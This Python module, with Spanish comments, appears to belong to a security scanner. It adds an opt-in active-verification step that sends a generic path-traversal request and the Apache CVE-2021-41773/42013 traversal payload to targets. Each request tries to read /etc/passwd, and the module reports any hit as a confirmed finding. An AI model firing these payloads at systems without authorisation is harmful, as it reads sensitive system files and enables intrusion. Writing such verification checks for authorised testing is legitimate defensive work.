#!/usr/bin/env python3
"""
Verificación activa (--active-verify).

Corre checks puntuales, no destructivos, para confirmar explotabilidad
real de hallazgos sospechosos -- en vez de quedarse solo en "POTENTIAL".
Cada check hace UNA petición controlada y compara contra un patrón de
éxito conocido. Nunca escala a explotación real (no sube shells, no
escribe archivos en el objetivo).

Requiere --active-verify explícito porque, aunque de bajo riesgo, estos
checks SÍ tocan el objetivo más allá de reconocimiento pasivo.
"""

import re
try:
    from termcolor import colored
except ImportError:
    from modules._vendor_termcolor import colored

try:
    import requests
except ImportError:
    requests = None


def _check_lfi_generico(url):
    """
    Prueba UNA petición de path traversal clásico y busca contenido de
    /etc/passwd. No prueba variantes de bypass, no hace fuzzing -- es
    una confirmación puntual, no un scanner de LFI completo.
    """
    if requests is None:
        return None

    payload_url = url.rstrip("/") + "/../../../../etc/passwd"

    try:
        resp = requests.get(payload_url, timeout=8, verify=False)
        if re.search(r"root:.*:0:0:", resp.text):
            return {"tipo": "LFI", "url": payload_url, "confirmado": True,
                     "evidencia": "Contenido de /etc/passwd presente en la respuesta"}
    except Exception:
        pass

    return None


def _check_cve_2021_41773(url):
    """
    Confirmación puntual del path traversal de Apache 2.4.49/2.4.50
    (CVE-2021-41773), solo si ya se correlacionó ese CVE para este host.
    """
    if requests is None:
        return None

    payload_url = url.rstrip("/") + "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

    try:
        resp = requests.get(payload_url, timeout=8, verify=False)
        if re.search(r"root:.*:0:0:", resp.text):
            return {"tipo": "CVE-2021-41773", "url": payload_url, "confirmado": True,
                     "evidencia": "Contenido de /etc/passwd presente en la respuesta"}
    except Exception:
        pass

    return None


CHECKS_POR_CVE = {
    "CVE-2021-41773": _check_cve_2021_41773,
    "CVE-2021-42013": _check_cve_2021_41773,  # variante del mismo bug
}


def verificar_activamente(urls, findings, folder):
    """
    Para cada finding con CVE conocido en CHECKS_POR_CVE, corre su check
    puntual contra cada URL detectada. Además siempre corre el check LFI
    genérico una vez por URL (es barato y de bajo riesgo).
    """
    if requests is None:
        print(colored("[!] Falta 'requests' para --active-verify.", "red"))
        return []

    confirmados = []

    for url in urls or []:
        resultado_lfi = _check_lfi_generico(url)
        if resultado_lfi:
            confirmados.append(resultado_lfi)
            print(colored(f"[!!!] LFI CONFIRMADO en {url}", "red"))

    cves_detectados = {f["cve"] for f in (findings or []) if f.get("cve")}

    for cve in cves_detectados:
        check_func = CHECKS_POR_CVE.get(cve)
        if not check_func:
            continue

        for url in urls or []:
            resultado = check_func(url)
            if resultado:
                confirmados.append(resultado)
                print(colored(f"[!!!] {cve} CONFIRMADO en {url}", "red"))

    _escribir_reporte(confirmados, folder)
    return confirmados


def _escribir_reporte(confirmados, folder):
    output = folder / "06_vulnerabilities" / "active-verification.md"
    output.parent.mkdir(parents=True, exist_ok=True)

    lines = ["# Verificación activa", "",
             "⚠️ Estos hallazgos se confirmaron con una petición real contra el objetivo.", ""]

    if not confirmados:
        lines.append("Ningún finding pudo confirmarse activamente (o no se corrió --active-verify).")
    else:
        for c in confirmados:
            lines.append(f"## {c['tipo']} — CONFIRMADO")
            lines.append(f"- URL: {c['url']}")
            lines.append(f"- Evidencia: {c['evidencia']}")
            lines.append("")

    output.write_text("\n".join(lines), encoding="utf-8")
